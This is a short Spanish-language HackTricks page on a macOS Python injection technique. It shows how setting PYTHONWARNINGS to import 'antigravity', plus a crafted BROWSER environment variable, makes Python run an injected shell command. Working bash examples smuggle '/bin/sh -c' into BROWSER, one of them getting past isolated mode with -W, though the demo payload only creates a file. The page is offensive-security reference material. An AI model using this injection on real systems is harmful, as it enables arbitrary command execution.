# Inyección de aplicaciones Python en macOS

{{#include ../../../banners/hacktricks-training.md}}

## Mediante las variables de entorno `PYTHONWARNINGS` y `BROWSER`

Si un atacante puede controlar el entorno de un proceso Python, la combinación de `PYTHONWARNINGS` y `BROWSER` puede desencadenar la ejecución de comandos cuando Python importa el módulo `antigravity` al procesar una opción de advertencia manipulada. La técnica depende de que `antigravity` abra una URL con el módulo `webbrowser` de Python, que respeta la variable de entorno `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## References

- [1] [Hacking con variables de entorno - elttam](https://www.elttam.com/blog/env/)
{{#include ../../../banners/hacktricks-training.md}}
